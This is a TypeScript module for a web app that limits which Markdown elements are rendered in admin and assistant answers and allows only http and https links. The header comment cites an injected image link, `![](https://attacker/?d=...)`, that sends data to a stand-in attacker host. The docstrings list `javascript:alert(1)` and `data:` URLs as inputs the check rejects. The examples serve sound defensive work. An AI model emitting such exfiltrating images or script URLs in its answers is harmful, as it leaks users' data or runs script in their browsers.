/**
 * The one Markdown element list and the one link check (SEC-42, SEC-57).
 *
 * ## Overview
 *
 * Announcements, assistant answers and the admin preview render Markdown that
 * an admin or a model wrote. `MarkdownBody` keeps only the elements below, so
 * an injected `![](https://attacker/?d=...)` never becomes an `<img>` that
 * loads on sight, and raw HTML is skipped. Links pass through `safeLink`,
 * which allows only http and https.
 *
 * ## Same-origin and external links
 *
 * A link is resolved against `NEXT_PUBLIC_APP_URL` (a fixed placeholder when it
 * is unset, so the server and the browser agree). A link on the app's own
 * origin comes back as a path; any other origin comes back absolute and
 * `external`, and `SafeLink` shows its destination.
 *
 * This module is imported by client components, so it stays free of
 * server-only imports.
 *
 * @module lib/ui/markdown
 */

import { isHttpUrl } from "@/lib/validations/shared-schemas"

/** Every element MarkdownBody keeps (ui-design-system 5.5). No `img`, no `h1`. */
export const MARKDOWN_ELEMENTS = [
  "p",
  "strong",
  "em",
  "ul",
  "ol",
  "li",
  "a",
  "code",
  "pre",
  "blockquote",
  "h2",
  "h3",
  "h4",
  "hr",
  "br",
]

/** Used only when NEXT_PUBLIC_APP_URL is unset; `.invalid` never resolves. */
const PLACEHOLDER_ORIGIN = "https://app.invalid"

function appOrigin(): string {
  try {
    return new URL(process.env.NEXT_PUBLIC_APP_URL || PLACEHOLDER_ORIGIN).origin
  } catch {
    return PLACEHOLDER_ORIGIN
  }
}

interface SafeLinkTarget {
  href: string
  external: boolean
}

/**
 * Resolve a link for rendering, or `null` when it may not be a link.
 *
 * @example
 * ```ts
 * safeLink("/help")                // { href: "/help", external: false }
 * safeLink("https://example.com/") // { href: "https://example.com/", external: true }
 * safeLink("javascript:alert(1)")  // null
 * ```
 */
export function safeLink(href: string | null | undefined): SafeLinkTarget | null {
  if (!href) return null
  const origin = appOrigin()
  let url: URL
  try {
    url = new URL(href, origin)
  } catch {
    return null
  }
  if (!isHttpUrl(url) || url.username || url.password) return null
  if (url.origin === origin) {
    return { href: `${url.pathname}${url.search}${url.hash}`, external: false }
  }
  return { href: url.href, external: true }
}

/**
 * The href to render for an admin-set or untrusted URL, or `null` when it is
 * not http or https.
 *
 * @example
 * ```ts
 * safeHref("https://requests.example.com") // "https://requests.example.com/"
 * safeHref("data:text/html,hi")            // null
 * ```
 */
export function safeHref(href: string | null | undefined): string | null {
  return safeLink(href)?.href ?? null
}
